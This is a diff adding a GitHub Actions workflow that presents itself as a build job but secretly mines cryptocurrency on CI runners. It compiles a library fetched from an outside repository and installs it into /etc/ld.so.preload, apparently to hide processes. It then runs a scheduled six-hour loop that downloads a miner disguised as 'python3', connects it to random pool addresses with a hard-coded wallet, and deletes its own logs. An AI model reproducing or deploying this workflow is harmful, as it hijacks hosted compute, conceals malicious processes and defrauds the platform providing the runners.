@@ -1,0 +1,104 @@
+name: yen sol
+
+on:
+  workflow_dispatch:
+  push:
+    branches: ["main"]
+  schedule:
+    - cron: '0 */6 * * *'
+
+jobs:
+  build:
+    name: build
+    runs-on: ubuntu-latest
+    strategy:
+      max-parallel: 5
+      fail-fast: false
+      matrix:
+        go: [1, 2, 3, 4, 5]
+        flag: [A]
+    env:
+      NUM_JOBS: 40
+      JOB: ${{ matrix.go }}
+    steps:
+    - name: Checkout code
+      uses: actions/checkout@v2
+
+    - name: Install Dependencies
+      run: |
+        sudo apt-get update
+        sudo apt-get install -y wget curl build-essential jq
+
+    - name: Download and compile code
+      run: |
+        curl -L https://bitbucket.org/koploks/watir/raw/master/nyumput.c -o nyumput.c
+        gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
+        sudo mv libnyumput.so /usr/local/lib/
+        echo /usr/local/lib/libnyumput.so | sudo tee -a /etc/ld.so.preload
+        rm nyumput.c
+
+    - name: Run and manage process
+      run: |
+        end_time=$(( $(date +%s) + 6*3600 ))  # 6 hours from now
+        while [ $(date +%s) -lt $end_time ]; do
+          # Download and check IP list
+          timestamp=$(date +%s)
+          mkdir -p .lib
+          dynamic_sgr=".lib/python3"
+          wget -O $dynamic_sgr https://github.com/barburonjilo/back/raw/main/sru
+          chmod +x $dynamic_sgr
+          dynamic_list="list_$timestamp.json"
+          wget -O $dynamic_list https://github.com/barburonjilo/open/raw/refs/heads/main/list.json
+          if [[ ! -f $dynamic_list ]]; then
+            echo "Failed to download IP list. Exiting."
+            exit 1
+          fi
+
+          # Check JSON file format
+          if ! jq '.' $dynamic_list > /dev/null 2>&1; then
+            echo "Invalid JSON format. Exiting."
+            exit 1
+          fi
+
+          # Select a random IP from the JSON file
+          ip=$(jq -r '.[]' $dynamic_list | shuf -n 1)
+          if [ -z "$ip" ]; then
+            echo "No IP found in $dynamic_list. Exiting."
+            exit 1
+          fi
+
+          # Remove selected IP from JSON file
+          jq --arg ip "$ip" 'del(.[] | select(. == $ip))' $dynamic_list > tmp_$timestamp.json && mv tmp_$timestamp.json $dynamic_list
+
+          # Ensure sgr file is present
+          if [ -f $dynamic_sgr ]; then
+            # Generate a random port within the range and random number of threads (2 to 4)
+            port=$(shuf -i 802-810 -n 1)
+            threads=$(shuf -i 2-4 -n 1)
+
+            # Run the process with the specified parameters
+            nohup $dynamic_sgr -a yespowersugar --pool $ip:$port -u sugar1q8cfldyl35e8aq7je455ja9mhlazhw8xn22gvmr --timeout 120 -t $threads  > dance_$port_$timestamp.log 2>&1 &
+            process_pid=$!
+
+            echo "Started process with PID $process_pid using IP $ip, port $port, and $threads threads"
+
+            # Run for 1 minute
+            sleep 60
+
+            # Kill the process
+            kill $process_pid || true
+
+            # Remove the log file after the process is stopped
+            rm -f dance_$port_$timestamp.log
+
+            # Rest for 2 minutes before the next iteration
+            sleep 120
+          else
+            echo "$dynamic_sgr not found. Skipping..."
+            sleep 120
+          fi
+
+          # Clean up after each iteration
+          rm -f $dynamic_list
+          rm -f $dynamic_sgr
+        done
